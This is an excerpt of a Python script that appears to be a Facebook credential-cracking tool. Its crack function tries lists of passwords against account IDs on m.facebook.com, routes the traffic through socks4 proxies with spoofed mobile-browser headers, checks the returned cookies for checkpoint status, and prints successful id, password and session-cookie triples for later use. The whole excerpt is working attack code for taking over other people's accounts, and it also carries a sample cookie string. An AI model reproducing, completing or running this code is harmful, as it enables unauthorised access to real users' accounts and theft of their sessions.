...
def DYNO():
	try:
		...
		MRDYNO()
def error():
	print(f'\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mError {x}')
	time.sleep(4)
	back()
def MRDYNO():
	try:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r[ ANIXH ] {P}{k}\033[1;37m{loop}\033[1;31m{P}  {P}{H}[ok] - {ok}{P}  {P}\033[1;31m{x}  {bo}{'{}'.format(loop/float(len(id)))}{P} "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            proxies = {'http': f'socks4://{nip}', 'https': f'socks4://{nip}'}
            ses.headers.update({
    'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=wNW2Z-BRySXIQ0OqbHge87HT; sb=wNW2Z6FzYoh8lwCNAG0awLAn; m_pixel_ratio=2.75; wd=393x712; fr=0bj2UhwR9Hi3Hvmud..BnttXA..AAA.0.0.Bnttby.AWVqYn52bWI',
    'dpr': '2.75',
    ...
    'viewport-width': '980',
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\x1b[32[ANISH-OK✔]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
                cek_LUFFY(kuki)
